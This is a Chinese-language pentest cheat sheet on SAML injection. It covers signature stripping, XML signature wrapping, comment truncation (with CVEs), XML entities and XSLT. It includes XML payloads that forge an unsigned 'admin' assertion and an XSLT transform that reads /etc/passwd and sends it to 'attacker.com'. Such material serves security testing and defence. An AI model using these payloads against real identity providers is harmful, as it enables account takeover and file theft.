# SAML 注入

> 安全声明标记语言 (SAML) 是一个开放标准，允许安全凭证有网络上多台计算机进行共享。使用基于SAML的单一登陆时(SSO)，涉及到三个部分，一个用户(所谓的委托人)，一个IDentity Provider(IDP)和一个云应用程序服务提供商(SP) -- centrify

## 概要

* [Tools](#tools)
* [Authentication Bypass](#authentication-bypass)
	* [Invalid Signature](#invalid-signature)
	* [Signature Stripping](#signature-stripping)
	* [XML Signature Wrapping Attacks](#xml-signature-wrapping-attacks)
	* [XML Comment Handling](#xml-comment-handling)
	* [XML External Entity](#xml-external-entity)
	* [Extensible Stylesheet Language Transformation](#extensible-stylesheet-language-transformation)

## Tools

- [SAML Raider - Burp Extension](https://github.com/SAMLRaider/SAMLRaider)


## Authentication Bypass

SAML响应应该包含`<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"`.

### Invalid Signature

未经真实CA签名的签名容易被克隆。请确保签名是由真实的CA签名的。如果证书是自签名的，则可以克隆该证书或创建自己的自签名证书来替换它。

### Signature Stripping

> [...]accepting unsigned SAML assertions is accepting a username without checking the password - @ilektrojohn

目标是在不签名的情况下创建一个格式良好的SAML断言。对于某些默认配置，如果在SAML响应中省略签名部分，则不执行签名验证。

SAML断言的示例，其中“NameID=admin”没有签名.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" Destination="http://localhost:7001/saml2/sp/acs/post" ID="id39453084082248801717742013" IssueInstant="2018-04-22T10:28:53.593Z" Version="2.0">
    <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" Format="urn:oasis:names:tc:SAML:2.0:nameidformat:entity">REDACTED</saml2:Issuer>
    <saml2p:Status xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol">
        <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success" />
    </saml2p:Status>
    <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="id3945308408248426654986295" IssueInstant="2018-04-22T10:28:53.593Z" Version="2.0">
        <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">REDACTED</saml2:Issuer>
        <saml2:Subject xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:NameID Format="urn:oasis:names:tc:SAML:1.1:nameidformat:unspecified">admin</saml2:NameID>
            <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml2:SubjectConfirmationData NotOnOrAfter="2018-04-22T10:33:53.593Z" Recipient="http://localhost:7001/saml2/sp/acs/post" />
            </saml2:SubjectConfirmation>
        </saml2:Subject>
        <saml2:Conditions NotBefore="2018-04-22T10:23:53.593Z" NotOnOrAfter="2018-0422T10:33:53.593Z" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:AudienceRestriction>
                <saml2:Audience>WLS_SP</saml2:Audience>
            </saml2:AudienceRestriction>
        </saml2:Conditions>
        <saml2:AuthnStatement AuthnInstant="2018-04-22T10:28:49.876Z" SessionIndex="id1524392933593.694282512" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:AuthnContext>
                <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
            </saml2:AuthnContext>
        </saml2:AuthnStatement>
    </saml2:Assertion>
</saml2p:Response>
```

### XML Signature Wrapping Attacks

XML签名包装（XSW）攻击，有些实现检查有效签名并将其与有效断言匹配，但不检查多个断言、多个签名，或根据断言的顺序采取不同的行为。

- XSW1–适用于SAML响应消息。在现有签名之后添加响应的克隆未签名副本。
- XSW2–适用于SAML响应消息。在现有签名之前添加响应的克隆未签名副本。
- XSW3–适用于SAML断言消息。在现有断言之前添加断言的克隆未签名副本。
- XSW4–适用于SAML响应消息。在现有签名之后添加响应的克隆未签名副本。
- XSW5–适用于SAML断言消息。更改断言的签名副本中的值，并添加原始断言的副本，在SAML消息的末尾删除签名。
- XSW6–适用于SAML断言消息。更改断言的签名副本中的值，并添加原始断言的副本，在原始签名之后删除签名。
- XSW7–适用于SAML断言消息。添加带有克隆的无符号断言的“扩展”块。
- XSW8–适用于SAML断言消息。添加一个“Object”块，其中包含删除签名的原始断言的副本。


在下面的示例中，将使用这些术语。

- FA：伪造的断言
- LA:   合法主张
- LAS:   合法主张的签名

```xml
<SAMLResponse>
  <FA ID="evil">
      <Subject>Attacker</Subject>
  </FA>
  <LA ID="legitimate">
      <Subject>Legitimate User</Subject>
      <LAS>
         <Reference Reference URI="legitimate">
         </Reference>
      </LAS>
  </LA>
</SAMLResponse>
```

在Github企业漏洞中，此请求将验证并为“攻击者”而不是“合法用户”创建会话，即使“FA”未签名。


### XML Comment Handling

已经对SSO系统的访问进行了身份验证的威胁参与者可以作为另一个用户进行身份验证，而无需该用户的SSO密码。此[漏洞]（https://www.bleepstatic.com/images/news/u/986406/attacks/Vulnerabilities/SAML-flucture.png）在以下库和产品中具有多个CVE。

- OneLogin - python-saml - CVE-2017-11427
- OneLogin - ruby-saml - CVE-2017-11428
- Clever - saml2-js - CVE-2017-11429
- OmniAuth-SAML - CVE-2017-11430
- Shibboleth - CVE-2018-0489
- Duo Network Gateway - CVE-2018-7340

研究人员已经注意到，如果攻击者在用户名字段中插入注释，从而破坏用户名，则攻击者可能获得对合法用户帐户的访问权限。

```xml
<SAMLResponse>
    <Issuer>https://idp.com/</Issuer>
    <Assertion ID="_id1234">
        <Subject>
            <NameID>user@user.com<!--XMLCOMMENT-->.evil.com</NameID>
```

其中“user@user.com”是用户名的第一部分，“evil.com”是第二部分。

### XML External Entity

另一种利用此漏洞的方法是使用“XML entities”绕过签名验证，因为除了在XML解析期间，内容不会更改。

In the following example:

- `&s;`将解析为字符串`"s"`
- `&f1;` 将解析为字符串 `"f1"`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Response [
  <!ENTITY s "s">
  <!ENTITY f1 "f1">
]>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
  Destination="https://idptestbed/Shibboleth.sso/SAML2/POST"
  ID="_04cfe67e596b7449d05755049ba9ec28"
  InResponseTo="_dbbb85ce7ff81905a3a7b4484afb3a4b"
  IssueInstant="2017-12-08T15:15:56.062Z" Version="2.0">
[...]
  <saml2:Attribute FriendlyName="uid"
    Name="urn:oid:0.9.2342.19200300.100.1.1"
    NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
    <saml2:AttributeValue>
      &s;taf&f1;
    </saml2:AttributeValue>
  </saml2:Attribute>
[...]
</saml2p:Response>
```

服务提供者接受SAML响应。由于该漏洞，服务提供程序应用程序将“taf”报告为“uid”属性的值。


### Extensible Stylesheet Language Transformation

可以使用“transform”元素执行XSLT。

![http://sso-attacks.org/images/4/49/XSLT1.jpg](http://sso-attacks.org/images/4/49/XSLT1.jpg)    
Picture from [http://sso-attacks.org/XSLT_Attack](http://sso-attacks.org/XSLT_Attack)    

```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  ...
    <ds:Transforms>
      <ds:Transform>
        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
          <xsl:template match="doc">
            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
            <xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
            <xsl:variable name="exploitUrl"select="concat($attackerUrl,$escaped)"/>
            <xsl:value-of select="unparsed-text($exploitUrl)"/>
          </xsl:template>
        </xsl:stylesheet>
      </ds:Transform>
    </ds:Transforms>
  ...
</ds:Signature>
```

## References

- [SAML Burp Extension - ROLAND BISCHOFBERGER - JULY 24, 2015](https://blog.compass-security.com/2015/07/saml-burp-extension/)
- [The road to your codebase is paved with forged assertions - @ilektrojohn - March 13, 2017](http://www.economyofmechanism.com/github-saml)
- [SAML_Security_Cheat_Sheet.md - OWASP](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SAML_Security_Cheat_Sheet.md)
- [On Breaking SAML: Be Whoever You Want to Be - Juraj Somorovsky, Andreas Mayer, Jorg Schwenk, Marco Kampmann, and Meiko Jensen](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91-8-23-12.pdf)
- [Making Headlines: SAML - March 19, 2018 - Torsten George](https://blog.centrify.com/saml/)
- [Vulnerability Note VU#475445 - 2018-02-27 - Carnegie Mellon University](https://www.kb.cert.org/vuls/id/475445/)
- [ORACLE WEBLOGIC - MULTIPLE SAML VULNERABILITIES (CVE-2018-2998/CVE-2018-2933) - Denis Andzakovic - Jul 18, 2018](https://pulsesecurity.co.nz/advisories/WebLogic-SAML-Vulnerabilities)
- [Truncation of SAML Attributes in Shibboleth 2 - 2018-01-15 - redteam-pentesting.de](https://www.redteam-pentesting.de/de/advisories/rt-sa-2017-013/-truncation-of-saml-attributes-in-shibboleth-2)
- [Attacking SSO: Common SAML Vulnerabilities and Ways to Find Them - March 7th, 2017 - Jem Jensen](https://blog.netspi.com/attacking-sso-common-saml-vulnerabilities-ways-find/)
- [How to Hunt Bugs in SAML; a Methodology - Part I - @epi052](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
- [How to Hunt Bugs in SAML; a Methodology - Part II - @epi052](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)
- [How to Hunt Bugs in SAML; a Methodology - Part III - @epi052](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)